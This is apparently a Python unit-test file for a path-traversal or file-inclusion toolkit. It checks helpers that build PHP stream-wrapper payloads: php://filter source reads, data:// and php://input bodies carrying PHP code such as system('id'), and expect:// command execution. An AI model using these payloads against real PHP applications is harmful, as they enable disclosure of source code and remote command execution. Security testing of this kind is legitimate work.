import base64

from traverse.wrappers import (
    php_filter_read, data_wrapper, expect_wrapper, php_input_body,
)


def test_php_filter_read():
    assert php_filter_read("index.php") == \
        "php://filter/convert.base64-encode/resource=index.php"


def test_data_wrapper_base64_roundtrips():
    w = data_wrapper("<?php echo 1;?>")
    b64 = w.split("base64,")[1]
    assert base64.b64decode(b64) == b"<?php echo 1;?>"
    assert w.startswith("data://text/plain;base64,")


def test_expect_wrapper():
    assert expect_wrapper("id") == "expect://id"


def test_php_input_body():
    marker, body = php_input_body("<?php system('id');?>")
    assert marker == "php://input"
    assert body == "<?php system('id');?>"
